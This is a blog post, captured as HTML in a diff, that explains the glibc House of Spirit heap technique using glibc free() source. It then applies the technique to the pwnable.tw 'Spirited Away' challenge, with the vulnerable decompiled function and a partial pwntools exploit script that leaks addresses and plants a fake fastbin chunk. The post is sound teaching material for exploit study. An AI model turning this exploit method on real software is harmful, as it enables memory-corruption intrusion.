@@ -1,0 +1,1025 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next mist" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="google-site-verification" content="-rILWvtgf7gbffrRwk-E1VWNCVLMTcq6pxgs_1IfIjo" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="heap,house-of-spirit" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="0x4C43's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。 0x01">
+<meta name="keywords" content="heap,house-of-spirit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux glibc heap house-of-spirit">
+<meta property="og:url" content="http://0x4c43.cn/2018/0413/linux-glibc-heap-houseofspirit/index.html">
+<meta property="og:site_name" content="0x4C43's Blog">
+<meta property="og:description" content="House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。 0x01">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/35769818.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/46175149.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/70375310.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/50239044.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/91788711.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/93324098.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/47717698.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/37025857.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/18602401.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/27242292.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/44036325.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/83693658.jpg">
+<meta property="og:updated_time" content="2018-05-29T10:42:23.327Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux glibc heap house-of-spirit">
+<meta name="twitter:description" content="House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。 0x01">
+<meta name="twitter:image" content="http://ooyovxue7.bkt.clouddn.com/18-4-12/35769818.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0x4c43.cn/2018/0413/linux-glibc-heap-houseofspirit/"/>
+
+
+
+
+
+
+
+  <title> Linux glibc heap house-of-spirit | 0x4C43's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0x4C43's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/2018/0413/linux-glibc-heap-houseofspirit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0x4C43">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/binary.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0x4C43's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Linux glibc heap house-of-spirit
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-13T10:30:14+08:00">
+                2018-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">Exploit</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/0413/linux-glibc-heap-houseofspirit/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/0413/linux-glibc-heap-houseofspirit/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。</p>
+<h1 id="0x01-释放-fastbin-chunk"><a href="#0x01-释放-fastbin-chunk" class="headerlink" title="0x01 释放 fastbin chunk"></a>0x01 释放 fastbin chunk</h1><h2 id="1-检查标志位"><a href="#1-检查标志位" class="headerlink" title="1. 检查标志位"></a>1. 检查标志位</h2><p>House of Spirit 利用思路是将伪造的 chunk 放入 fastbin 中，下面分析堆管理实现中释放 fastbin chunk 的过程。首先，当释放的 chunk 是由 mmap() 创建时（即 IS_MMAPPED 标志位为 1）会调用 munmap_chunk() 进行释放。而我们希望能调用 _int_free() 函数将 fake chunk 放入 fastbin，因此在伪造 chunk 时要把 IS_MMAPPED 设置为 0。此外把 NON_MAIN_ARENA 标志位也设置为 0。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// malloc.c in glibc2.23</span></div><div class="line"><span class="keyword">void</span> __libc_free (<span class="keyword">void</span> *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr;</div><div class="line">  mchunkptr p;                          <span class="comment">// chunk corresponding to mem</span></div><div class="line"></div><div class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</div><div class="line">    = atomic_forced_read (__free_hook);</div><div class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">// free(0) has no effect</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line"></div><div class="line">  p = mem2chunk (mem);</div><div class="line">  <span class="comment">// 判断是否由 mmap 创建的 chunk</span></div><div class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                <span class="comment">// release mmapped memory.</span></div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></div><div class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</div><div class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</div><div class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</div><div class="line">        &#123;</div><div class="line">          mp_.mmap_threshold = chunksize (p);</div><div class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</div><div class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</div><div class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">      munmap_chunk (p);   <span class="comment">// 调用 munmap_chunk 函数释放</span></div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  ar_ptr = arena_for_chunk (p);</div><div class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);   <span class="comment">// 调用 _int_free 函数释放</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="2-检查-size"><a href="#2-检查-size" class="headerlink" title="2. 检查 size"></a>2. 检查 size</h2><p>在 _int_free() 函数中，释放 chunk 时会检查该 chunk 和下一个 chunk 的 size 字段。因此，在伪造 chunk 时应满足以下条件。    </p>
+<blockquote>
+<p>1）fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值（32bits 系统中为 64 bytes，64 bits 系统中为 128 bytes）。<br>2)  fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ（ SIZE_SZ ，32bits 系统中为 4 bytes，64 bits 系统中为 8 bytes），小于 av-&gt;system_mem（132kb，即 0x21000 bytes）。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* malloc.c in glibc2.23 */</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock) &#123;</div><div class="line">     mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></div><div class="line">     INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></div><div class="line">     mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></div><div class="line">     ...</div><div class="line">     p = mem2chunk(mem);</div><div class="line">     size = chunksize(p);</div><div class="line">     ...</div><div class="line">     <span class="comment">// fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值</span></div><div class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div><div class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) &#123;</div><div class="line">       <span class="comment">// fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ，小于 av-&gt;system_mem</span></div><div class="line">       <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">           || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</div><div class="line">           …</div><div class="line">           errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">           <span class="keyword">goto</span> errout;</div><div class="line">         &#125;</div><div class="line">       ...</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<p> 若伪造的 chunk 能满足以上几个条件，便能成功欺骗 free() 函数把 fake chunk 放入 fastbin 中，当再次申请合适大小的内存时将返回 fake chunk，进而控制目标内存。    </p>
+<h1 id="0x2-利用思路"><a href="#0x2-利用思路" class="headerlink" title="0x2 利用思路"></a>0x2 利用思路</h1><p>下面是一个利用场景：程序中存在栈溢出漏洞，溢出长度不足以覆盖栈中返回地址等目标内存，但是能覆盖栈中一个即将被 free 的堆指针 ptr。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/35769818.jpg" alt=""><br>利用思路如下：    </p>
+<blockquote>
+<p>1）在可控区域 1 中伪造一个 chunk，伪造的 chunk 应满足上述条件，并确保该 chunk 能覆盖目标内存区域；<br>2)  为了知道 fake chunk 的地址，需泄露栈地址。之后通过栈溢出等漏洞修改即将释放的堆指针 ptr，使其指向 <code>fake chunk + 2*size_t</code>（prev_size 和 size 字段的大小，32 bits 系统中为 4 bytes，64 bits 系统中为 8 bytes）；<br>3）执行 free(ptr) 释放 ptr，fake chunk 被放入 fastbin 中；<br>4）使用 malloc 申请合适大小的内存，此时将返回刚释放的 fake chunk，使得目标区域可控。    </p>
+</blockquote>
+<h1 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h1><p>下面以 pwnable.tw 中的 Spirited Away 为例分析该利用方法。程序和 exp 可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-spirit" target="_blank" rel="external">github</a>下载。   </p>
+<h2 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1. 漏洞"></a>1. 漏洞</h2><p>程序中存在以下两个漏洞。</p>
+<h3 id="1）缓存区溢出"><a href="#1）缓存区溢出" class="headerlink" title="1）缓存区溢出"></a>1）缓存区溢出</h3><p>程序中调用 sprintf 函数时存在溢出漏洞，变量 v1 为 56 bytes，当评论数量 cnt 达到 3 位数时会溢出（54+3 &gt; 56），导致其相邻变量 nbytes 被覆盖。利用该漏洞可将 nbytes 修改为 110（“n”的 ASCII 值为 0x6e），由于 nbytes 控制着 name 和 comment 的输入长度，从而又一次产生溢出漏洞。</p>
+<h3 id="2）信息泄露"><a href="#2）信息泄露" class="headerlink" title="2）信息泄露"></a>2）信息泄露</h3><p>此外，还存在一个信息泄露漏洞，由于栈中变量 reason 未初始化，输出 reason 时会把栈中数据一起输出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+10h] [ebp-E8h]   // 56 bytes</span></div><div class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></div><div class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></div><div class="line">  <span class="keyword">char</span> comment; <span class="comment">// [esp+50h] [ebp-A8h]   // 80 bytes</span></div><div class="line">  <span class="keyword">int</span> age; <span class="comment">// [esp+A0h] [ebp-58h]</span></div><div class="line">  <span class="keyword">void</span> *name; <span class="comment">// [esp+A4h] [ebp-54h]   // 指向内存空间为 60 bytes的堆指针</span></div><div class="line">  <span class="keyword">int</span> reason; <span class="comment">// [esp+A8h] [ebp-50h]    // 80 bytes</span></div><div class="line"></div><div class="line">  nbytes = <span class="number">60</span>;    <span class="comment">// 控制name 和 comment的输入长度</span></div><div class="line">  v3 = <span class="number">80</span>;</div><div class="line">LABEL_2:</div><div class="line">  <span class="built_in">memset</span>(&amp;comment, <span class="number">0</span>, <span class="number">80u</span>);   <span class="comment">// reason未初始化</span></div><div class="line">  name = <span class="built_in">malloc</span>(<span class="number">60u</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, name, nbytes);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;reason, v3);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;comment, nbytes);</div><div class="line">  ++cnt;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, name);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;reason);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;comment);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);  <span class="comment">// overflow</span></div><div class="line">  <span class="built_in">puts</span>(&amp;v1);</div><div class="line">…</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2. 利用脚本"></a>2. 利用脚本</h2><p>完整的利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="comment"># author: 0x4C43</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./spirited_away'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./spirited_away'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment1</span><span class="params">(name,age,reason,comment)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.send(reason)</div><div class="line">    p.recvuntil(<span class="string">'comment: '</span>)</div><div class="line">    p.send(comment)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment2</span><span class="params">(age,reason)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.sendline(reason)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">24</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">24</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    <span class="keyword">print</span> hex(addr)</div><div class="line">    libc_base = addr -libc.symbols[<span class="string">'_IO_file_sync'</span>]<span class="number">-7</span></div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> libc_base</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakstack</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">80</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">80</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakechunk</span><span class="params">(stack)</span>:</span></div><div class="line">    fake_chunk = <span class="string">"DDDD"</span>        <span class="comment"># prev_size</span></div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># size</span></div><div class="line">    fake_chunk += (<span class="number">0x40</span><span class="number">-8</span>)*<span class="string">"D"</span></div><div class="line">    fake_chunk += p32(<span class="number">0</span>)  </div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># next chunk size</span></div><div class="line"></div><div class="line">    fake_chunk_ptr = stack - <span class="number">0x70</span> + <span class="number">8</span></div><div class="line">    comment  = <span class="string">"D"</span> * <span class="number">0x50</span></div><div class="line">    comment += p32(<span class="number">0x00</span>)       <span class="comment"># fake age</span></div><div class="line">    comment += p32(fake_chunk_ptr) <span class="comment"># overwrite name ptr</span></div><div class="line"></div><div class="line">    comment1(<span class="string">"DDDD"</span>,<span class="string">"40"</span>,fake_chunk, comment)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    raw_input(<span class="string">'add 100 comment to overwrite nbytes'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        comment1(<span class="string">"AAAA"</span>,<span class="string">"10"</span>,<span class="string">"AAAA"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.sendline(<span class="string">'y'</span>)</div><div class="line">    <span 